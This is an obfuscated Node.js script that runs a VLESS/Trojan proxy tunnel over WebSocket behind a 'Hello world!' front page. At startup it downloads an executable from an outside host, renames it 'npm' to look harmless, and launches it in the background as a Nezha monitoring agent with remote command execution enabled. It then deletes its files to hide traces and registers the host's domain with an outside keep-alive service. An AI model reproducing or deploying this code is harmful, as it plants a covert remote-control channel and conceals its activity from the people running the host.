const _0x300d0d=_0x19e3;(function(_0x56408a,_0x34f159){const _0x3e11cc=_0x19e3,_0x31603c=_0x56408a();while(!![]){try{const _0x275fba=-parseInt(_0x3e11cc(0xd8))/0x1+-parseInt(_0x3e11cc(0x93))/0x2*(parseInt(_0x3e11cc(0xd3))/0x3)+parseInt(_0x3e11cc(0xc6))/0x4+parseInt(_0x3e11cc(0xbe))/0x5*(-parseInt(_0x3e11cc(0xb5))/0x6)+parseInt(_0x3e11cc(0xaa))/0x7+parseInt(_0x3e11cc(0x98))/0x8+-parseInt(_0x3e11cc(0xd6))/0x9*(-parseInt(_0x3e11cc(0xec))/0xa);if(_0x275fba===_0x34f159)break;else _0x31603c['push'](_0x31603c['shift']());}catch(_0x3427c6){_0x31603c['push'](_0x31603c['shift']());}}}(_0x7abe,0xab52d));const os=require('os'),http=require(_0x300d0d(0xa0)),fs=require('fs'),axios=require(_0x300d0d(0xe3)),net=require(_0x300d0d(0xc9)),path=require(_0x300d0d(0xac)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x300d0d(0xe6)][_0x300d0d(0xca)]||_0x300d0d(0xa3),NEZHA_SERVER=process[_0x300d0d(0xe6)][_0x300d0d(0x8d)]||'',NEZHA_PORT=process[_0x300d0d(0xe6)][_0x300d0d(0x91)]||'',NEZHA_KEY=process[_0x300d0d(0xe6)][_0x300d0d(0xe0)]||'',DOMAIN=process['env'][_0x300d0d(0xa6)]||'1234.abc.com',AUTO_ACCESS=process[_0x300d0d(0xe6)][_0x300d0d(0xd5)]||!![],WSPATH=process[_0x300d0d(0xe6)][_0x300d0d(0xa9)]||UUID[_0x300d0d(0xce)](0x0,0x8),SUB_PATH=process[_0x300d0d(0xe6)]['SUB_PATH']||'sub',NAME=process[_0x300d0d(0xe6)]['NAME']||'',PORT=process[_0x300d0d(0xe6)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0xdb4a53=_0x300d0d;try{const _0x3870b4=await axios['get'](_0xdb4a53(0xed)),_0x24db60=_0x3870b4[_0xdb4a53(0x82)];ISP=(_0x24db60[_0xdb4a53(0x9b)]+'-'+_0x24db60[_0xdb4a53(0xb8)])[_0xdb4a53(0x9f)](/ /g,'_');}catch(_0x455eb8){ISP=_0xdb4a53(0xab);}};GetISP();const httpServer=http[_0x300d0d(0xc5)]((_0x4a8965,_0x3d171f)=>{const _0x50ab66=_0x300d0d;if(_0x4a8965['url']==='/'){const _0x42e6b1=path['join'](__dirname,'index.html');fs['readFile'](_0x42e6b1,_0x50ab66(0xc3),(_0x17c160,_0x956a1)=>{const _0xa1edad=_0x50ab66;if(_0x17c160){_0x3d171f[_0xa1edad(0xd1)](0xc8,{'Content-Type':_0xa1edad(0xcf)}),_0x3d171f[_0xa1edad(0x9a)](_0xa1edad(0xba));return;}_0x3d171f[_0xa1edad(0xd1)](0xc8,{'Content-Type':'text/html'}),_0x3d171f[_0xa1edad(0x9a)](_0x956a1);});return;}else{if(_0x4a8965[_0x50ab66(0xd7)]==='/'+SUB_PATH){const _0x152141=NAME?NAME+'-'+ISP:ISP,_0x428a0b='vless://'+UUID+'@'+DOMAIN+_0x50ab66(0xb6)+DOMAIN+_0x50ab66(0xe5)+DOMAIN+_0x50ab66(0xd0)+WSPATH+'#'+_0x152141,_0x48235a=_0x50ab66(0xb0)+UUID+'@'+DOMAIN+_0x50ab66(0xbf)+DOMAIN+_0x50ab66(0xe5)+DOMAIN+_0x50ab66(0xd0)+WSPATH+'#'+_0x152141,_0x50a535=_0x428a0b+'\x0a'+_0x48235a,_0x3377d8=Buffer['from'](_0x50a535)[_0x50ab66(0xc7)]('base64');_0x3d171f[_0x50ab66(0xd1)](0xc8,{'Content-Type':_0x50ab66(0xa1)}),_0x3d171f['end'](_0x3377d8+'\x0a');}else _0x3d171f[_0x50ab66(0xd1)](0x194,{'Content-Type':_0x50ab66(0xa1)}),_0x3d171f[_0x50ab66(0x9a)](_0x50ab66(0xc1));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x300d0d(0x9f)](/-/g,''),DNS_SERVERS=[_0x300d0d(0xe7),_0x300d0d(0x8c)];function resolveHost(_0x165880){return new Promise((_0x415b46,_0x49c859)=>{const _0x4eb0ca=_0x19e3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4eb0ca(0xee)](_0x165880)){_0x415b46(_0x165880);return;}let _0x45bee5=0x0;function _0x12d1f7(){const _0x233f94=_0x4eb0ca;if(_0x45bee5>=DNS_SERVERS['length']){_0x49c859(new Error(_0x233f94(0xf0)+_0x165880+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3e80f6=DNS_SERVERS[_0x45bee5];_0x45bee5++;const _0x562b50='https://dns.google/resolve?name='+encodeURIComponent(_0x165880)+'&type=A';axios[_0x233f94(0x8b)](_0x562b50,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x233f94(0xd9)](_0x5b6fbb=>{const _0x27f88e=_0x233f94,_0x568430=_0x5b6fbb[_0x27f88e(0x82)];if(_0x568430[_0x27f88e(0x97)]===0x0&&_0x568430[_0x27f88e(0xb4)]&&_0x568430[_0x27f88e(0xb4)][_0x27f88e(0x8f)]>0x0){const _0x31aaf7=_0x568430['Answer'][_0x27f88e(0xcb)](_0xe15838=>_0xe15838[_0x27f88e(0x95)]===0x1);if(_0x31aaf7){_0x415b46(_0x31aaf7['data']);return;}}_0x12d1f7();})['catch'](_0x9a91e0=>{_0x12d1f7();});}_0x12d1f7();});}function handleVlessConnection(_0x1e4852,_0x2936ec){const _0x4cd449=_0x300d0d,[_0x2f9fb1]=_0x2936ec,_0x2e65b1=_0x2936ec[_0x4cd449(0xce)](0x1,0x11);if(!_0x2e65b1[_0x4cd449(0xbc)]((_0x9a5c7f,_0x1236b5)=>_0x9a5c7f==parseInt(uuid[_0x4cd449(0x85)](_0x1236b5*0x2,0x2),0x10)))return![];let _0x3c20c8=_0x2936ec[_0x4cd449(0xce)](0x11,0x12)[_0x4cd449(0xae)]()+0x13;const _0x34cffc=_0x2936ec[_0x4cd449(0xce)](_0x3c20c8,_0x3c20c8+=0x2)[_0x4cd449(0xea)](0x0),_0x2aaf1c=_0x2936ec[_0x4cd449(0xce)](_0x3c20c8,_0x3c20c8+=0x1)[_0x4cd449(0xae)](),_0x1b3048=_0x2aaf1c==0x1?_0x2936ec['slice'](_0x3c20c8,_0x3c20c8+=0x4)['join']('.'):_0x2aaf1c==0x2?new TextDecoder()['decode'](_0x2936ec[_0x4cd449(0xce)](_0x3c20c8+0x1,_0x3c20c8+=0x1+_0x2936ec[_0x4cd449(0xce)](_0x3c20c8,_0x3c20c8+0x1)['readUInt8']())):_0x2aaf1c==0x3?_0x2936ec[_0x4cd449(0xce)](_0x3c20c8,_0x3c20c8+=0x10)['reduce']((_0xe8aff1,_0x4e2273,_0x270244,_0x5d85ad)=>_0x270244%0x2?_0xe8aff1[_0x4cd449(0xc0)](_0x5d85ad[_0x4cd449(0xce)](_0x270244-0x1,_0x270244+0x1)):_0xe8aff1,[])['map'](_0x591924=>_0x591924[_0x4cd449(0xea)](0x0)[_0x4cd449(0xc7)](0x10))[_0x4cd449(0x7f)](':'):'';_0x1e4852['send'](new Uint8Array([_0x2f9fb1,0x0]));const _0x3626fd=createWebSocketStream(_0x1e4852);return resolveHost(_0x1b3048)[_0x4cd449(0xd9)](_0xf51db5=>{const _0x338fb8=_0x4cd449;net[_0x338fb8(0x89)]({'host':_0xf51db5,'port':_0x34cffc},function(){const _0x49d487=_0x338fb8;this[_0x49d487(0xb9)](_0x2936ec[_0x49d487(0xce)](_0x3c20c8)),_0x3626fd['on'](_0x49d487(0xcc),()=>{})[_0x49d487(0x9c)](this)['on'](_0x49d487(0xcc),()=>{})['pipe'](_0x3626fd);})['on'](_0x338fb8(0xcc),()=>{});})[_0x4cd449(0xc2)](_0x3695ab=>{const _0x586d68=_0x4cd449;net['connect']({'host':_0x1b3048,'port':_0x34cffc},function(){const _0x1f21d8=_0x19e3;this[_0x1f21d8(0xb9)](_0x2936ec[_0x1f21d8(0xce)](_0x3c20c8)),_0x3626fd['on'](_0x1f21d8(0xcc),()=>{})[_0x1f21d8(0x9c)](this)['on']('error',()=>{})['pipe'](_0x3626fd);})['on'](_0x586d68(0xcc),()=>{});}),!![];}function _0x19e3(_0x52094b,_0x5cf429){_0x52094b=_0x52094b-0x7f;const _0x7abe80=_0x7abe();let _0x19e3ec=_0x7abe80[_0x52094b];return _0x19e3ec;}function handleTrojanConnection(_0x692b1c,_0x48527a){const _0x4c08df=_0x300d0d;try{if(_0x48527a[_0x4c08df(0x8f)]<0x3a)return![];const _0x2f6336=_0x48527a[_0x4c08df(0xce)](0x0,0x38)[_0x4c08df(0xc7)](),_0x40d4a9=[UUID];let _0x198046=null;for(const _0x2b9d54 of _0x40d4a9){const _0xaeb1bf=crypto[_0x4c08df(0xe4)](_0x4c08df(0xbd))['update'](_0x2b9d54)[_0x4c08df(0x80)](_0x4c08df(0xcd));if(_0xaeb1bf===_0x2f6336){_0x198046=_0x2b9d54;break;}}if(!_0x198046)return![];let _0x1da9b5=0x38;_0x48527a[_0x1da9b5]===0xd&&_0x48527a[_0x1da9b5+0x1]===0xa&&(_0x1da9b5+=0x2);const _0x3b7389=_0x48527a[_0x1da9b5];if(_0x3b7389!==0x1)return![];_0x1da9b5+=0x1;const _0x16a4c5=_0x48527a[_0x1da9b5];_0x1da9b5+=0x1;let _0x162c34,_0xfcdebd;if(_0x16a4c5===0x1)_0x162c34=_0x48527a[_0x4c08df(0xce)](_0x1da9b5,_0x1da9b5+0x4)[_0x4c08df(0x7f)]('.'),_0x1da9b5+=0x4;else{if(_0x16a4c5===0x3){const _0x110d10=_0x48527a[_0x1da9b5];_0x1da9b5+=0x1,_0x162c34=_0x48527a[_0x4c08df(0xce)](_0x1da9b5,_0x1da9b5+_0x110d10)['toString'](),_0x1da9b5+=_0x110d10;}else{if(_0x16a4c5===0x4)_0x162c34=_0x48527a['slice'](_0x1da9b5,_0x1da9b5+0x10)[_0x4c08df(0x87)]((_0x27bb73,_0x48a158,_0x20e2c6,_0x281c3d)=>_0x20e2c6%0x2?_0x27bb73[_0x4c08df(0xc0)](_0x281c3d[_0x4c08df(0xce)](_0x20e2c6-0x1,_0x20e2c6+0x1)):_0x27bb73,[])['map'](_0x53e570=>_0x53e570['readUInt16BE'](0x0)[_0x4c08df(0xc7)](0x10))[_0x4c08df(0x7f)](':'),_0x1da9b5+=0x10;else return![];}}_0xfcdebd=_0x48527a[_0x4c08df(0xea)](_0x1da9b5),_0x1da9b5+=0x2;_0x1da9b5<_0x48527a[_0x4c08df(0x8f)]&&_0x48527a[_0x1da9b5]===0xd&&_0x48527a[_0x1da9b5+0x1]===0xa&&(_0x1da9b5+=0x2);const _0x534540=createWebSocketStream(_0x692b1c);return resolveHost(_0x162c34)[_0x4c08df(0xd9)](_0x3ee3d4=>{const _0x3cdaff=_0x4c08df;net[_0x3cdaff(0x89)]({'host':_0x3ee3d4,'port':_0xfcdebd},function(){const _0x4741d2=_0x3cdaff;_0x1da9b5<_0x48527a[_0x4741d2(0x8f)]&&this['write'](_0x48527a['slice'](_0x1da9b5)),_0x534540['on'](_0x4741d2(0xcc),()=>{})[_0x4741d2(0x9c)](this)['on'](_0x4741d2(0xcc),()=>{})[_0x4741d2(0x9c)](_0x534540);})['on'](_0x3cdaff(0xcc),()=>{});})[_0x4c08df(0xc2)](_0x2611ea=>{const _0x1928e3=_0x4c08df;net['connect']({'host':_0x162c34,'port':_0xfcdebd},function(){const _0x393ca9=_0x19e3;_0x1da9b5<_0x48527a[_0x393ca9(0x8f)]&&this[_0x393ca9(0xb9)](_0x48527a['slice'](_0x1da9b5)),_0x534540['on'](_0x393ca9(0xcc),()=>{})[_0x393ca9(0x9c)](this)['on'](_0x393ca9(0xcc),()=>{})['pipe'](_0x534540);})['on'](_0x1928e3(0xcc),()=>{});}),!![];}catch(_0x3ae99a){return![];}}wss['on'](_0x300d0d(0x9e),(_0x700579,_0x376bb8)=>{const _0x589bd7=_0x300d0d,_0x591871=_0x376bb8[_0x589bd7(0xd7)]||'';_0x700579[_0x589bd7(0xb2)](_0x589bd7(0xdc),_0x1fdd7d=>{const _0x1b4170=_0x589bd7;if(_0x1fdd7d[_0x1b4170(0x8f)]>0x11&&_0x1fdd7d[0x0]===0x0){const _0x4fe4c5=_0x1fdd7d[_0x1b4170(0xce)](0x1,0x11),_0x4b6dcb=_0x4fe4c5[_0x1b4170(0xbc)]((_0x106dbb,_0x170b04)=>_0x106dbb==parseInt(uuid['substr'](_0x170b04*0x2,0x2),0x10));if(_0x4b6dcb){!handleVlessConnection(_0x700579,_0x1fdd7d)&&_0x700579[_0x1b4170(0x81)]();return;}}!handleTrojanConnection(_0x700579,_0x1fdd7d)&&_0x700579[_0x1b4170(0x81)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x2ed0=_0x300d0d,_0x33efda=os[_0x2ed0(0xad)]();return _0x33efda===_0x2ed0(0xef)||_0x33efda===_0x2ed0(0x83)||_0x33efda==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2ed0(0xde):!NEZHA_PORT?_0x2ed0(0xda):_0x2ed0(0xc4);},downloadFile=async()=>{const _0x32a3ec=_0x300d0d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x214b38=getDownloadUrl(),_0xd34304=await axios({'method':_0x32a3ec(0x8b),'url':_0x214b38,'responseType':'stream'}),_0x3fb366=fs[_0x32a3ec(0xd2)](_0x32a3ec(0xdd));return _0xd34304[_0x32a3ec(0x82)][_0x32a3ec(0x9c)](_0x3fb366),new Promise((_0x4e5f48,_0x2d4351)=>{const _0x4a0a7f=_0x32a3ec;_0x3fb366['on'](_0x4a0a7f(0xe9),()=>{const _0x204dcb=_0x4a0a7f;console['log'](_0x204dcb(0x88)),exec(_0x204dcb(0xc8),_0x1821e8=>{if(_0x1821e8)_0x2d4351(_0x1821e8);_0x4e5f48();});}),_0x3fb366['on'](_0x4a0a7f(0xcc),_0x2d4351);});}catch(_0x522726){throw _0x522726;}},runnz=async()=>{const _0x4e7cdd=_0x300d0d;try{const _0x4548b7=execSync(_0x4e7cdd(0xdb),{'encoding':_0x4e7cdd(0x94)});if(_0x4548b7['trim']()!==''){console[_0x4e7cdd(0x8e)](_0x4e7cdd(0xaf));return;}}catch(_0x1f6c2e){}await downloadFile();let _0x59d578='',_0x372778=[_0x4e7cdd(0x90),_0x4e7cdd(0xe2),_0x4e7cdd(0xa4),_0x4e7cdd(0x86),_0x4e7cdd(0xdf),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x59acce=_0x372778[_0x4e7cdd(0x8a)](NEZHA_PORT)?_0x4e7cdd(0xeb):'';_0x59d578=_0x4e7cdd(0xb7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e7cdd(0x84)+NEZHA_KEY+'\x20'+_0x59acce+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x36758b=NEZHA_SERVER[_0x4e7cdd(0x8a)](':')?NEZHA_SERVER['split'](':')[_0x4e7cdd(0x9d)]():'',_0x102b10=_0x372778[_0x4e7cdd(0x8a)](_0x36758b)?_0x4e7cdd(0xa2):_0x4e7cdd(0xa8),_0x587ce9=_0x4e7cdd(0xa7)+NEZHA_KEY+_0x4e7cdd(0x92)+NEZHA_SERVER+_0x4e7cdd(0xbb)+_0x102b10+_0x4e7cdd(0xe1)+UUID;fs[_0x4e7cdd(0xb3)](_0x4e7cdd(0xf1),_0x587ce9);}_0x59d578='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4e7cdd(0x8e)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x59d578,{'shell':_0x4e7cdd(0xe8)},_0x10c58e=>{const _0x2f73aa=_0x4e7cdd;if(_0x10c58e)console[_0x2f73aa(0xcc)]('npm\x20running\x20error:',_0x10c58e);else console[_0x2f73aa(0x8e)](_0x2f73aa(0x99));});}catch(_0x1beb49){console[_0x4e7cdd(0xcc)]('error:\x20'+_0x1beb49);}};async function addAccessTask(){const _0x506e43=_0x300d0d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5305c9='https://'+DOMAIN;try{const _0x25dbf8=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x5305c9},{'headers':{'Content-Type':'application/json'}});console['log'](_0x506e43(0xb1));}catch(_0x347e96){}}const delFiles=()=>{const _0x8b389a=_0x300d0d;fs[_0x8b389a(0x96)](_0x8b389a(0xdd),()=>{}),fs['unlink']('config.yaml',()=>{});};function _0x7abe(){const _0x5c6c01=['find','error','hex','slice','text/html','&path=%2F','writeHead','createWriteStream','609ptJsIP','listen','AUTO_ACCESS','9YABDXH','url','665414qwIehi','then','https://amd64.ssss.nyc.mn/v1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','message','npm','https://arm64.ssss.nyc.mn/agent','2083','NEZHA_KEY','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8443','axios','createHash','&fp=chrome&type=ws&host=','env','8.8.4.4','/bin/bash','finish','readUInt16BE','--tls','7849030gIrwEK','https://api.ip.sb/geoip','test','arm','Failed\x20to\x20resolve\x20','config.yaml','join','digest','close','data','arm64','\x20-p\x20','substr','2087','reduce','npm\x20download\x20successfully','connect','includes','get','1.1.1.1','NEZHA_SERVER','log','length','443','NEZHA_PORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','11930MgOOqP','utf-8','type','unlink','Status','236584sVuVVX','npm\x20is\x20running','end','country_code','pipe','pop','connection','replace','http','text/plain','true','1ce6b01d-ff38-4baa-bcf3-411fbf24a7b6','2096','Server\x20is\x20running\x20on\x20port\x20','DOMAIN','client_secret:\x20','false','WSPATH','8450603WOKblA','Unknown','path','arch','readUInt8','npm\x20is\x20already\x20running,\x20skip\x20running...','trojan://','Automatic\x20Access\x20Task\x20added\x20successfully','once','writeFileSync','Answer','53220xqEtqM',':443?encryption=none&security=tls&sni=','setsid\x20nohup\x20./npm\x20-s\x20','isp','write','Hello\x20world!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','every','sha224','95akEslE',':443?security=tls&sni=','concat','Not\x20Found\x0a','catch','utf8','https://amd64.ssss.nyc.mn/agent','createServer','2899500cpQRFq','toString','chmod\x20+x\x20npm','net','UUID'];_0x7abe=function(){return _0x5c6c01;};return _0x7abe();}httpServer[_0x300d0d(0xd4)](PORT,()=>{const _0x38d0cc=_0x300d0d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x38d0cc(0xa5)+PORT);});
